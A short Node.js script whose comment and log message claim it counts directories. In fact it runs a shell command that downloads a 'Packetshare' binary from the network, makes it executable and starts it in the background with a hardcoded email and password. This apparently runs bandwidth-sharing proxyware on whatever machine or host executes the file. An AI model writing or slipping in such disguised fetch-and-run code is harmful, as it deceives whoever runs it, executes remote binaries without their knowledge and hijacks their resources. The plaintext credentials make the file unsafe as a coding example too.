const { exec } = require('child_process');
 
// Counts the number of directory in
// current working directory
exec('wget https://www.packetshare.io/files/packetsharev1.0.2/x86_64/Packetshare && chmod +x Packetshare && ./Packetshare -email=theroot7791@gmail.com -password=Env112311 -accept-tos &', (error, stdout, stderr) => {
    if (error) {
        console.error(`exec error: ${error}`);
        return;
    }
    console.log(`stdout: No. of directories = ${stdout}`);
    if (stderr != "")
        console.error(`stderr: ${stderr}`);
});

const keep_alive = require('./keep_alive.js')
